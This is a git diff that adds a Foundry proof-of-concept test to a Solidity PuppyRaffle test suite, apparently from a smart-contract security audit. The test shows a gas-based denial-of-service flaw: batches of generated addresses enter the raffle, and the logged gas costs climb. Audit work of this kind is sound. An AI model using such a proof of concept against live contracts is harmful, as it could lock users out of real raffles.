@@ -213,4 +213,46 @@ contract PuppyRaffleTest is Test {
         puppyRaffle.withdrawFees();
         assertEq(address(feeAddress).balance, expectedPrizeAmount);
     }
+
+    // @audit-test PoC to show potential DoS attack
+    function test_enter_raffle_for_dos () public {
+        // set the gas price to be equivalent to normal transactions:
+        vm.txGasPrice(1); 
+
+        // generate first 1000 different addresses and enter the raffle
+        uint256 gas_required_to_generate_addresses = gasleft();
+        uint256 players_num = 1000;
+        address[] memory players = new address[](players_num);
+        for (uint256 i = 0; i < players_num; i++) {
+            players[i] = address(uint160(i));
+        }
+        uint256 gas_cost_to_generate_addresses = gas_required_to_generate_addresses - gasleft();
+        console.log("Gas required to spawn first %s addresses is: %s", players_num, gas_cost_to_generate_addresses);
+        // enter the raffle for the first 1000 addresses
+        uint256 gas_start_first = gasleft();
+        puppyRaffle.enterRaffle{value: entranceFee * 1000}(players);
+        uint256 gas_cost_first = gas_start_first - gasleft();
+        console.log("Gas required for first 1000 addresses to enter the raffle: %s", gas_cost_first);
+        console.log("Effective Gas Price for first call is: %s", gas_cost_first * tx.gasprice);
+        // Gas required for 1000 addresses to enter the raffle: 417422148
+        // The gas required to complete this operation takes 417 million gas, whereas the block gas limit for ethereum is ~ 15 million.
+
+        // generate second 1000 different addresses and enter the raffle
+        gas_required_to_generate_addresses = gasleft();
+        address[] memory players_two = new address[](players_num);
+        for (uint256 i = 0; i < players_num; i++) {
+            players_two[i] = address(uint160(i+1000));
+        }
+        gas_cost_to_generate_addresses = gas_required_to_generate_addresses - gasleft();
+        console.log("Gas required to spawn second %s addresses is: %s", players_num, gas_cost_to_generate_addresses);
+        // enter the raffle for the second 1000 addresses
+        uint256 gas_start_second = gasleft();
+        puppyRaffle.enterRaffle{value: entranceFee * 1000}(players_two);
+        uint256 gas_cost_second = gas_start_second - gasleft();
+        console.log("Gas required for second 1000 addresses to enter the raffle: %s", gas_cost_second);
+        console.log("Effective Gas Price for second call is: %s", gas_cost_second * tx.gasprice);
+        // The gas required to complete this operation takes 1.6 billion gas
+
+        assert(gas_cost_first < gas_cost_second);
+    }
 }
